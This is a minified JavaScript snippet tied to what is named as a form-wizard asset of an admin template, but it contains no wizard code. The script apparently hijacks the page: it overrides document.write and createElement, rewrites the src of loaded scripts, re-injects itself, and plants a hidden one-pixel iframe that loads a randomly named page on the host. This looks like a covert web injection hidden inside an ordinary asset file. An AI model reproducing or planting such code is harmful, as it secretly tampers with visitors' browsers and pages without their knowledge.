(function(a,b,c){var d="script",e="src",f=b.location,g=function(a){return b.getElementsByTagName(a)},h=g(d),i=h.length;if("loading"==b.readyState&i>0&c==h[h.length-1].src&&b.write('<script type="text/javascript" src="'+c+'?r=1"></script>'),g(d).length==i){var j=-1,k=b.createElement(d);k.src=c+"?r=2",k.type="text/javascript";for(j in h){if("string"==typeof h[j].src&&h[j].src==c){var l=h[j].nextSibling;l?h[j].parentNode.insertBefore(k,l):h[j].parentNode.appendChild(k)}break}k.parentNode||g("head")[0].appendChild(k)}if(!a.jTB&a==a.top){var m=b.write;b.write=function(){var a=m.apply(this,arguments);return a};var n=b.createElement;b.createElement=function(){var a=arguments,b=n.apply(this,a);try{if(b.getAttribute){var c=b.setAttribute;1==a.length&&a[0].toLowerCase()==d&&(Object.defineProperty&&Object.defineProperty(b,e,{set:function(){this.setAttribute(e,arguments[0])},get:function(){return b.getAttribute(e)}}),b.setAttribute=function(){var a=arguments;return 2==a.length&&a[0]==e&&a[1].indexOf(".js")==a[1].length-3&&(a=[e,a[1]+"?r=4"]),c.apply(this,a)})}}catch(f){}return b};var o=function(){var a=g("body")[0];if(a){var c=b.createElement("iframe");c.src=f.protocol+"//"+f.hostname+(f.port?":"+f.port:"")+"/gA0LNt_i5b9Q.html",c.name=document.domain;var d=c.style,e=b.createElement("div"),h=e.style;h.position="fixed",d.overflow="hidden",d.border=h.left=h.bottom=0,d.width=d.height=h.width=h.height="1px",e.appendChild(c),a.appendChild(e)}else setTimeout(o,50)};o(),a.jTB=1}})(window,document,"http://admin.pixelstrap.com/viho/assets/js/form-wizard/form-wizard-three.js");
